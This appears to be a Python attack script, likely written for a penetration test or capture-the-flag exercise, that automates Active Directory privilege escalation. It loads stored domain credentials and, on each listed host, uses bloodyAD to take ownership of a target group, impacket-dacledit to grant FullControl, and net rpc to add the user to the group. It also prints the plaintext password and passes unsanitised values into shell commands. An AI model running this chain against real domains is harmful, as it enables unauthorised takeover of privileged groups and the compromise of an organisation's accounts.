import subprocess
import json
import os
import argparse

# Parser for the target_group argument
parser = argparse.ArgumentParser(description="Apply permissions to target group using creds from creds/management_svc_initial.json")
parser.add_argument("-target_group", required=True, help="Target group for permissions")
args = parser.parse_args()

target_group = args.target_group

# Folder where the JSON with credentials is located
creds_dir = "creds"
cred_file = os.path.join(creds_dir, "management_svc_initial.json")  # fixed, no longer depends on target_group

# Read credentials from JSON
if not os.path.exists(cred_file):
    print(f"[-] Credential file {cred_file} does not exist!")
    exit(1)

with open(cred_file, "r") as f:
    data = json.load(f)

user = data.get("username")
password = data.get("password")
domain = data.get("domain")
hosts_file = data.get("hosts_file")

if not all([user, password, domain, hosts_file]):
    print("[-] Missing information in credential file!")
    exit(1)

print(f"[+] Using credentials: {user}/{password} on domain {domain}")
print(f"[+] Hosts file: {hosts_file}")
print(f"[+] Target group: {target_group}")

# Function to run commands and stop on failure
def run_cmd(cmd, host=""):
    print(f"Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)
    print(result.stderr)

    # Check for errors
    if result.returncode != 0 or "insufficient" in result.stderr.lower() or "error" in result.stderr.lower():
        print("_______ You are not allowed to modify the group! _______")
        if host:
            print(f"[-] Error on host: {host}")
        exit(1)
    return result.stdout + result.stderr

# Iterate through hosts_file and apply commands
with open(hosts_file, "r") as f:
    for line in f:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Assuming format: IP Hostname Domain DC
        parts = line.split()
        if len(parts) < 2:
            continue
        ip = parts[0]
        hostname = parts[1]

        print(f"[+] Processing host: {ip} {hostname}")

        # Command 0: Set owner using bloodyAD
        bloodyad_cmd = f'bloodyAD --host "{ip}" -d "{domain}" -u "{user}" -p "{password}" set owner {target_group} {user}'
        print(f"[+] Setting owner for {target_group} using bloodyAD on host {hostname}")
        result = subprocess.run(bloodyad_cmd, shell=True, capture_output=True, text=True)
        print(result.stdout)
        print(result.stderr)
        if result.returncode != 0 or "error" in result.stderr.lower() or "fail" in result.stderr.lower():
            print("[-] Failed to set owner with bloodyAD!")
            exit(1)

        # Command 1: impacket-dacledit
        dacledit_cmd = f'impacket-dacledit -action write -rights "FullControl" -inheritance -principal "{user}" -target "{target_group}" "{domain}/{user}:{password}"'
        run_cmd(dacledit_cmd, host=hostname)

        # Command 2: net rpc group addmem
        net_cmd = f'net rpc group addmem "{target_group}" "{user}" -U "{domain}/{user}%{password}" -S "{hostname}"'
        run_cmd(net_cmd, host=hostname)
